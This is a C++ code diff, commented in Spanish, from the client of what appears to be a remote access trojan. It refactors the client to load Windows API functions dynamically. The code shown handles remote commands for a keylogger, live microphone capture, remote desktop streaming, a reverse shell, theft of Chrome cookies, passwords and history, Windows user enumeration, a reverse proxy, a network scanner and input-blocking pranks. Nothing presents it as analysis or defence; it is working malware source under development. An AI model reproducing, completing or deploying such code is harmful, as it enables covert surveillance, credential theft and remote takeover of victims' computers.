@@ -38,11 +38,17 @@ void Cliente::DestroyClasses() {
     if (this->mod_RemoteDesk != nullptr) {
         this->mod_RemoteDesk->DetenerLive();
         DeleteObj<mod_RemoteDesktop>(this->mod_RemoteDesk);
+        if (this->mod_dynamic) {
+            this->mod_dynamic->UnloadRDDlls();
+        }
     }
 
     if (this->mod_Mic != nullptr) {
         this->mod_Mic->m_DetenerLive();
         DeleteObj<Mod_Mic>(this->mod_Mic);
+        if (this->mod_dynamic) {
+            this->mod_dynamic->UnloadMicProcs();
+        }
     }
 
     if (this->reverseSHELL != nullptr) {
@@ -64,27 +70,26 @@ void Cliente::DestroyClasses() {
         }
         DeleteObj<mod_Camera>(this->mod_Cam);
     }
-
-    if (this->mod_AdminVen != nullptr) {
-        DeleteObj<mod_AdminVentanas>(this->mod_AdminVen);
-    }
-
-    if (this->mod_Inf0 != nullptr) {
-        DeleteObj<mod_Info>(this->mod_Inf0);
-    }
-
-    if (this->mod_ReverseProxy != nullptr) {
-        DeleteObj<ReverseProxy>(this->mod_ReverseProxy);
-    }
-
-    if (this->mod_Scan != nullptr) {
-        DeleteObj<mod_Escaner>(this->mod_Scan);
-    }
-
-    if (this->mod_Fun != nullptr) {
+    
+    if (this->mod_Fun) {
         DeleteObj<modFun>(this->mod_Fun);
+        if (this->mod_dynamic) {
+            this->mod_dynamic->UnloadFunDlls();
+        }
     }
 
+    if (this->mod_Inf0) {
+        DeleteObj<mod_Info>(this->mod_Inf0);
+        if (this->mod_dynamic) {
+            this->mod_dynamic->UnloadInfoProcs();
+        }
+    }
+
+    DeleteObj<mod_AdminVentanas>(this->mod_AdminVen);
+    DeleteObj<ReverseProxy>(this->mod_ReverseProxy);
+    DeleteObj<mod_Escaner>(this->mod_Scan);
+    DeleteObj<DynamicLoad>(this->mod_dynamic);
+    
     __DBG_("[DC] Clases destruidas");
 }
 
@@ -101,62 +106,13 @@ void Cliente::setKillSwitch(bool _value) {
 
 Cliente::Cliente() {
     this->Init_Key();
-
-    //Cargar dlls y funciones
-    this->hKernel32DLL = wrapLoadDLL("kernel32.dll");
-    this->hAdvapi32DLL = wrapLoadDLL("advapi32.dll");
-    this->hShell32DLL = wrapLoadDLL("shell32.dll");
-    this->hWtsapi32DLL = wrapLoadDLL("Wtsapi32.dll");
-    this->hPsApiDLL = wrapLoadDLL("psapi.dll");
-    this->hUser23DLL = wrapLoadDLL("user32.dll");
-
     
-    if (this->hKernel32DLL) {
-        this->KERNEL32.pGetComputerName      = (st_Kernel32::LPGETCOMPUTERNAMEA)   wrapGetProcAddr(this->hKernel32DLL, "GetComputerNameA");
-        this->KERNEL32.pGetNativeSystemInfo  = (st_Kernel32::LPGETNATIVESYSTEMINFO)wrapGetProcAddr(this->hKernel32DLL, "GetNativeSystemInfo");
-        this->KERNEL32.pCreateProcessA       = (st_Kernel32::LPCREATEPROCESSA)     wrapGetProcAddr(this->hKernel32DLL, "CreateProcessA");
-        this->KERNEL32.pOpenProcess          = (st_Kernel32::LPOPENPROCESS)        wrapGetProcAddr(this->hKernel32DLL, "OpenProcess");
-        this->KERNEL32.pTerminateProcess     = (st_Kernel32::LPTERMINATEPROCESS)   wrapGetProcAddr(this->hKernel32DLL, "TerminateProcess");
-        this->KERNEL32.pCloseHandle          = (st_Kernel32::LPCLOSEHANDLE)        wrapGetProcAddr(this->hKernel32DLL, "CloseHandle");
-        this->KERNEL32.pGlobalMemoryStatusEx = (st_Kernel32::LPGLOBALMEMORYSTATUSEX)wrapGetProcAddr(this->hKernel32DLL, "GlobalMemoryStatusEx");
-        this->KERNEL32.pCopyFileA            = (st_Kernel32::LPCOPYFILEA)wrapGetProcAddr(this->hKernel32DLL, "CopyFileA");
-        this->KERNEL32.pReadFile = (st_Kernel32::LPREADFILE)wrapGetProcAddr(this->hKernel32DLL, "ReadFile");
-        this->KERNEL32.pWriteFile = (st_Kernel32::LPWRITEFILE)wrapGetProcAddr(this->hKernel32DLL, "WriteFile");
-        this->KERNEL32.pDeleteFileA = (st_Kernel32::LPDELETEFILEA)wrapGetProcAddr(this->hKernel32DLL, "DeleteFileA");
-    
-        //Reverse shell
-        this->KERNEL32.pCreatePipe = (st_Kernel32::LPCREATEPIPE)wrapGetProcAddr(this->hKernel32DLL, "CreatePipe");
-        this->KERNEL32.pPeekNamedPipe = (st_Kernel32::LPPEEKNAMEDPIPE)wrapGetProcAddr(this->hKernel32DLL, "PeekNamedPipe");
-
-    }
-
-    if (this->hAdvapi32DLL) {
-        this->ADVAPI32.pGetUserName     = (st_Advapi32::LPGETUSERNAMEA)   wrapGetProcAddr(this->hAdvapi32DLL, "GetUserNameA");
-        this->ADVAPI32.pRegOpenKeyEx    = (st_Advapi32::LPREGOPENKEY)     wrapGetProcAddr(this->hAdvapi32DLL, "RegOpenKeyExA");
-        this->ADVAPI32.pRegQueryValueEx = (st_Advapi32::LPREGQUERYVALUEEX)wrapGetProcAddr(this->hAdvapi32DLL, "RegQueryValueExA");
-        this->ADVAPI32.pRegCloseKey     = (st_Advapi32::LPREGCLOSEKEY)    wrapGetProcAddr(this->hAdvapi32DLL, "RegCloseKey");
-        this->ADVAPI32.pLookupAccountSidA = (st_Advapi32::LPLOOKUPACCOUNTSIDA)wrapGetProcAddr(this->hAdvapi32DLL, "LookupAccountSidA");
-    }
-
-    if (this->hShell32DLL) {
-        this->SHELL32.pShellExecuteExA = (st_Shell32::LPSHELLEXECUTEEXA)wrapGetProcAddr(this->hShell32DLL, "ShellExecuteExA");
-    }
-
-    if (this->hWtsapi32DLL) {
-        this->WTSAPI32.pWTSEnumerateProcessesA = (st_Wtsapi32::LPWTSENUMERATEPROCESSES)wrapGetProcAddr(this->hWtsapi32DLL, "WTSEnumerateProcessesA");
-        this->WTSAPI32.pWTSFreeMemory = (st_Wtsapi32::LPWTSFREEMEMORY)wrapGetProcAddr(this->hWtsapi32DLL, "WTSFreeMemory");
-    }
-
-    if (this->hPsApiDLL) {
-        this->PSAPI.pGetModuleFileNameExA = (st_PsApi::LPGETMODULEFILNAMEEX)wrapGetProcAddr(this->hPsApiDLL, "GetModuleFileNameExA");
-
-    }
-
-    
+    //Cargar modulo para carga dinamica de funciones y dlls
+    this->mod_dynamic = new DynamicLoad();
 }
 
 void Cliente::TEST() {
-    this->mod_Fun = new modFun(this->hUser23DLL);
+    this->mod_Fun = new modFun(this->mod_dynamic->USER32_FUN, this->mod_dynamic->WINMM);
     this->mod_Fun->m_CD(TRUE);
     this->mod_Fun->m_Msg("1337 :v", "Testing", MB_ICONERROR);
 }
@@ -164,31 +120,6 @@ void Cliente::TEST() {
 Cliente::~Cliente() {
 	this->CerrarConexion();
     this->DestroyClasses();
-
-    //Cerrar dlls
-    if (this->hKernel32DLL) {
-        wrapFreeLibrary(this->hKernel32DLL);
-    }
-
-    if (this->hAdvapi32DLL) {
-        wrapFreeLibrary(this->hAdvapi32DLL);
-    }
-
-    if (this->hShell32DLL) {
-        wrapFreeLibrary(this->hShell32DLL);
-    }
-
-    if (this->hWtsapi32DLL) {
-        wrapFreeLibrary(this->hWtsapi32DLL);
-    }
-
-    if (this->hPsApiDLL) {
-        wrapFreeLibrary(this->hPsApiDLL);
-    }
-
-    if (this->hUser23DLL) {
-        wrapFreeLibrary(this->hUser23DLL);
-    }
 }
 
 void Cliente::CerrarConexion() {
@@ -285,6 +216,9 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     int iRecibido = paquete.cBuffer.size(); // esto -1 con datos binarios
     int iComando = paquete.uiTipoPaquete;
 
+    //#####################################################
+    //#####################################################
+    //            TRANSFERENCIA DE ARCHIVOS               # 
     if (iComando == EnumComandos::FM_Descargar_Archivo_Recibir) {
         strIn = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 1);
         //strIn[0] = id archivo
@@ -548,7 +482,8 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //#                   KEYLOGGER                       #
     if (iComando == EnumComandos::KL_Iniciar) {
         if (this->mod_Key == nullptr) {
-            this->mod_Key = new mod_Keylogger();
+            this->mod_dynamic->LoadKLProcs();
+            this->mod_Key = new mod_Keylogger(this->mod_dynamic->KERNEL32, this->mod_dynamic->USER32_KL);
             this->mod_Key->Start();
         }
         return;
@@ -673,7 +608,8 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //Lista de dispositivos de entrada (mic)
     if (iComando == EnumComandos::Mic_Refre_Dispositivos) {
         if (this->mod_Mic == nullptr) {
-            this->mod_Mic = new Mod_Mic();
+            this->mod_dynamic->LoadMicProcs();
+            this->mod_Mic = new Mod_Mic(this->mod_dynamic->WINMMMIC);
         }
 
         this->mod_Mic->sckSocket = this->sckSocket;
@@ -684,7 +620,8 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //Escuchar mic en tiempo real
     if (iComando == EnumComandos::Mic_Iniciar_Escucha) {
         if (this->mod_Mic == nullptr) {
-            this->mod_Mic = new Mod_Mic();
+            this->mod_dynamic->LoadMicProcs();
+            this->mod_Mic = new Mod_Mic(this->mod_dynamic->WINMMMIC);
         }
         if (!this->mod_Mic->isLiveMic) {
             this->mod_Mic->sckSocket = this->sckSocket;
@@ -746,7 +683,12 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //Lista de pantallas
     if (iComando == EnumComandos::RD_Lista) {
         if (!this->mod_RemoteDesk) {
-            this->mod_RemoteDesk = new mod_RemoteDesktop(this->hUser23DLL);
+            this->mod_dynamic->LoadRDProcs();
+            this->mod_RemoteDesk = new mod_RemoteDesktop(
+                this->mod_dynamic->USER32_RD, 
+                this->mod_dynamic->GDI32_RD, 
+                this->mod_dynamic->GDIPLUS_RD, 
+                this->mod_dynamic->OLE32);
         }
         std::string strPaquete = "";
         std::vector<Monitor> Monitores = this->mod_RemoteDesk->m_ListaMonitores();
@@ -776,7 +718,12 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     if (iComando == EnumComandos::RD_Single) {
         //Enviar solo una captura
         if (!this->mod_RemoteDesk) {
-            this->mod_RemoteDesk = new mod_RemoteDesktop(this->hUser23DLL);
+            this->mod_dynamic->LoadRDProcs();
+            this->mod_RemoteDesk = new mod_RemoteDesktop(
+                this->mod_dynamic->USER32_RD,
+                this->mod_dynamic->GDI32_RD,
+                this->mod_dynamic->GDIPLUS_RD,
+                this->mod_dynamic->OLE32);
         }
         //Si estra creado pero si no se esta en modo live
         if (this->mod_RemoteDesk && !this->mod_RemoteDesk->m_isRunning()) {
@@ -804,7 +751,12 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //Iniciar live
     if (iComando == EnumComandos::RD_Start) {
         if (!this->mod_RemoteDesk) {
-            this->mod_RemoteDesk = new mod_RemoteDesktop(this->hUser23DLL);
+            this->mod_dynamic->LoadRDProcs();
+            this->mod_RemoteDesk = new mod_RemoteDesktop(
+                this->mod_dynamic->USER32_RD,
+                this->mod_dynamic->GDI32_RD,
+                this->mod_dynamic->GDIPLUS_RD,
+                this->mod_dynamic->OLE32);
         }
         if (this->mod_RemoteDesk) {
             strIn = strSplit(std::string(paquete.cBuffer.data()), '|', 2);
@@ -896,7 +848,8 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //                ADMIN VENTANAS                      # 
     if (iComando == EnumComandos::WM_Lista) {
         if (!this->mod_AdminVen) {
-            this->mod_AdminVen = new mod_AdminVentanas(this->hUser23DLL);
+            this->mod_dynamic->LoadWMProcs();
+            this->mod_AdminVen = new mod_AdminVentanas(this->mod_dynamic->USER32_WM);
         }
         //Enviar lista parseada de ventanas
         std::string strPaquete = "";
@@ -913,7 +866,8 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
 
     if (iComando == EnumComandos::WM_CMD) {
         if (!this->mod_AdminVen) {
-            this->mod_AdminVen = new mod_AdminVentanas(this->hUser23DLL);
+            this->mod_dynamic->LoadWMProcs();
+            this->mod_AdminVen = new mod_AdminVentanas(this->mod_dynamic->USER32_WM);
         }
 
         strIn = strSplit(paquete.cBuffer.data(), CMD_DEL, 2);
@@ -933,7 +887,8 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //Enviar lista de perfiles de chrome
     if (iComando == EnumComandos::INF_Chrome_Profiles) {
         if (this->mod_Inf0 == nullptr) {
-            this->mod_Inf0 = new mod_Info();
+            this->mod_dynamic->LoadInfoProcs();
+            this->mod_Inf0 = new mod_Info(this->mod_dynamic->BCRYPT, this->mod_dynamic->CRYPT32, this->mod_dynamic->NETAPI32);
         }
         std::string strPaquete = "N/A";
         std::vector<Chrome_Profile> vcProfiles = this->mod_Inf0->m_ChromeProfiles();
@@ -964,7 +919,8 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //Enviar datos de navegacion de perfil (descargas,historial,cookies,passwords)
     if (iComando == EnumComandos::INF_Chrome_Profile_Data) {
         if (this->mod_Inf0 == nullptr) {
-            this->mod_Inf0 = new mod_Info();
+            this->mod_dynamic->LoadInfoProcs();
+            this->mod_Inf0 = new mod_Info(this->mod_dynamic->BCRYPT, this->mod_dynamic->CRYPT32, this->mod_dynamic->NETAPI32);
         }
         strIn = strSplit(paquete.cBuffer.data(), CMD_DEL, 2);
         if (strIn.size() == 2) {
@@ -983,7 +939,8 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //Enviar datos de usuarios de windows
     if (iComando == EnumComandos::INF_Users) {
         if (this->mod_Inf0 == nullptr) {
-            this->mod_Inf0 = new mod_Info();
+            this->mod_dynamic->LoadInfoProcs();
+            this->mod_Inf0 = new mod_Info(this->mod_dynamic->BCRYPT, this->mod_dynamic->CRYPT32, this->mod_dynamic->NETAPI32);
         }
         std::string strPaquete = this->mod_Inf0->m_GetUsersData();
         if (strPaquete.size() > 6) {
@@ -994,6 +951,9 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         return;
     }
 
+    //#####################################################
+    //#####################################################
+    //               PROXY INVERSA                        # 
     //Datos de proxy remoto
     if (iComando == EnumComandos::PROXY_CMD) {
         if (!this->mod_ReverseProxy) {
@@ -1004,6 +964,9 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         return;
     }
 
+    //#####################################################
+    //#####################################################
+    //               ESCANER DE RED                       # 
     //Escanear red PING
     if (iComando == EnumComandos::Net_Scan) {
         if (!this->mod_Scan) {
@@ -1043,10 +1006,14 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         return;
     }
     
+    //#####################################################
+    //#####################################################
+    //               BROMAS                               # 
     //Mod fun - swap mouse
     if (iComando == EnumComandos::Fun_Swap_Mouse) {
         if (this->mod_Fun == nullptr) {
-            this->mod_Fun = new modFun(this->hUser23DLL);
+            this->mod_dynamic->LoadFunProcs();
+            this->mod_Fun = new modFun(this->mod_dynamic->USER32_FUN, this->mod_dynamic->WINMM);
         }
         BOOL _swap = atoi(paquete.cBuffer.data());
         this->mod_Fun->m_SwapMouse(_swap);
@@ -1056,7 +1023,8 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //Mod fun - block input
     if (iComando == EnumComandos::Fun_Block_Input) {
         if (this->mod_Fun == nullptr) {
-            this->mod_Fun = new modFun(this->hUser23DLL);
+            this->mod_dynamic->LoadFunProcs();
+            this->mod_Fun = new modFun(this->mod_dynamic->USER32_FUN, this->mod_dynamic->WINMM);
         }
         BOOL _block = atoi(paquete.cBuffer.data());
         this->mod_Fun->m_BlockInput(_block);
@@ -1066,7 +1034,8 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //Mod fun - msg
     if (iComando == EnumComandos::Fun_Msg) {
         if (this->mod_Fun == nullptr) {
-            this->mod_Fun = new modFun(this->hUser23DLL);
+            this->mod_dynamic->LoadFunProcs();
+            this->mod_Fun = new modFun(this->mod_dynamic->USER32_FUN, this->mod_dynamic->WINMM);
         }
         std::vector<std::string> vcData = strSplit(std::string(paquete.cBuffer.data()), "<ravdo>", 3);
         if (vcData.size() == 3) {
@@ -1083,7 +1052,8 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //Mod fun - cd
     if (iComando == EnumComandos::Fun_CD) {
         if (this->mod_Fun == nullptr) {
-            this->mod_Fun = new modFun(this->hUser23DLL);
+            this->mod_dynamic->LoadFunProcs();
+            this->mod_Fun = new modFun(this->mod_dynamic->USER32_FUN, this->mod_dynamic->WINMM);
         }
         BOOL _open = atoi(paquete.cBuffer.data());
         this->mod_Fun->m_CD(_open);
@@ -1533,8 +1503,8 @@ bool ReverseShell::SpawnShell(const char* pstrComando) {
     sa.nLength = sizeof(SECURITY_ATTRIBUTES);
     sa.lpSecurityDescriptor = nullptr;
     sa.bInheritHandle = true;
-    if (cCliente->KERNEL32.pCreatePipe) {
-        if (!cCliente->KERNEL32.pCreatePipe(&this->stdinRd, &this->stdinWr, &sa, 0) || !cCliente->KERNEL32.pCreatePipe(&this->stdoutRd, &this->stdoutWr, &sa, 0)) {
+    if (cCliente->mod_dynamic->KERNEL32.pCreatePipe) {
+        if (!cCliente->mod_dynamic->KERNEL32.pCreatePipe(&this->stdinRd, &this->stdinWr, &sa, 0) || !cCliente->mod_dynamic->KERNEL32.pCreatePipe(&this->stdoutRd, &this->stdoutWr, &sa, 0)) {
             cCliente->m_RemoteLog("[SHELL] CreatePipe error: " + std::to_string(GetLastError()));
             __DBG_("Error creando tuberias");
             return false;
@@ -1547,8 +1517,8 @@ bool ReverseShell::SpawnShell(const char* pstrComando) {
         si.hStdError = this->stdoutWr;
         si.hStdInput = this->stdinRd;
 
-        if (cCliente->KERNEL32.pCreateProcessA) {
-            if (cCliente->KERNEL32.pCreateProcessA(nullptr, (LPSTR)pstrComando, nullptr, nullptr, true, CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &this->pi) == 0) {
+        if (cCliente->mod_dynamic->KERNEL32.pCreateProcessA) {
+            if (cCliente->mod_dynamic->KERNEL32.pCreateProcessA(nullptr, (LPSTR)pstrComando, nullptr, nullptr, true, CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &this->pi) == 0) {
                 cCliente->m_RemoteLog("[SHELL] CreateProcess error: " + std::to_string(GetLastError()));
                 __DBG_("No se pudo spawnear la shell");
                 return false;
@@ -1585,25 +1555,25 @@ void ReverseShell::TerminarShell() {
 
     cCliente->cChunkSend(this->sckSocket, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, true, nullptr, EnumComandos::Reverse_Shell_Finish);
     
-    if (cCliente->KERNEL32.pTerminateProcess) {
-        cCliente->KERNEL32.pTerminateProcess(this->pi.hProcess, 0);
+    if (cCliente->mod_dynamic->KERNEL32.pTerminateProcess) {
+        cCliente->mod_dynamic->KERNEL32.pTerminateProcess(this->pi.hProcess, 0);
     }
     
-    if (cCliente->KERNEL32.pCloseHandle) {
+    if (cCliente->mod_dynamic->KERNEL32.pCloseHandle) {
         if (this->stdinRd != nullptr) {
-            cCliente->KERNEL32.pCloseHandle(this->stdinRd);
+            cCliente->mod_dynamic->KERNEL32.pCloseHandle(this->stdinRd);
             this->stdinRd = nullptr;
         }
         if (this->stdinWr != nullptr) {
-            cCliente->KERNEL32.pCloseHandle(this->stdinWr);
+            cCliente->mod_dynamic->KERNEL32.pCloseHandle(this->stdinWr);
             this->stdinWr = nullptr;
         }
         if (this->stdoutRd != nullptr) {
-            cCliente->KERNEL32.pCloseHandle(this->stdoutRd);
+            cCliente->mod_dynamic->KERNEL32.pCloseHandle(this->stdoutRd);
             this->stdoutRd = nullptr;
         }
         if (this->stdoutWr != nullptr) {
-            cCliente->KERNEL32.pCloseHandle(this->stdoutWr);
+            cCliente->mod_dynamic->KERNEL32.pCloseHandle(this->stdoutWr);
             this->stdoutWr = nullptr;
         }
     }
@@ -1628,11 +1598,11 @@ void ReverseShell::thLeerShell(HANDLE hPipe) {
             break;
         }
 
-        if (cCliente->KERNEL32.pPeekNamedPipe) {
-            if (cCliente->KERNEL32.pPeekNamedPipe(hPipe, cBuffer, sizeof(cBuffer), &dBytesReaded, nullptr, nullptr)) {
+        if (cCliente->mod_dynamic->KERNEL32.pPeekNamedPipe) {
+            if (cCliente->mod_dynamic->KERNEL32.pPeekNamedPipe(hPipe, cBuffer, sizeof(cBuffer), &dBytesReaded, nullptr, nullptr)) {
                 if (dBytesReaded > 0) {
-                    if (cCliente->KERNEL32.pReadFile) {
-                        cCliente->KERNEL32.pReadFile(hPipe, cBuffer, sizeof(cBuffer), &dBytesReaded, nullptr);
+                    if (cCliente->mod_dynamic->KERNEL32.pReadFile) {
+                        cCliente->mod_dynamic->KERNEL32.pReadFile(hPipe, cBuffer, sizeof(cBuffer), &dBytesReaded, nullptr);
                     }
                 }else {
                     std::this_thread::sleep_for(std::chrono::milliseconds(10));
@@ -1671,8 +1641,8 @@ void ReverseShell::thEscribirShell(std::string pStrInput) {
 
     DWORD dBytesWrited = 0;
     //stdinWr tuberia de entrada
-    if (cCliente->KERNEL32.pWriteFile) {
-        if (!cCliente->KERNEL32.pWriteFile(this->stdinWr, pStrInput.c_str(), pStrInput.size(), &dBytesWrited, nullptr)) {
+    if (cCliente->mod_dynamic->KERNEL32.pWriteFile) {
+        if (!cCliente->mod_dynamic->KERNEL32.pWriteFile(this->stdinWr, pStrInput.c_str(), pStrInput.size(), &dBytesWrited, nullptr)) {
             cCliente->m_RemoteLog("[SHELL] WriteFile error: " + std::to_string(GetLastError()));
             __DBG_("Error escribiendo a la tuberia\n-DATA: " + pStrInput);
             this->StopShell();
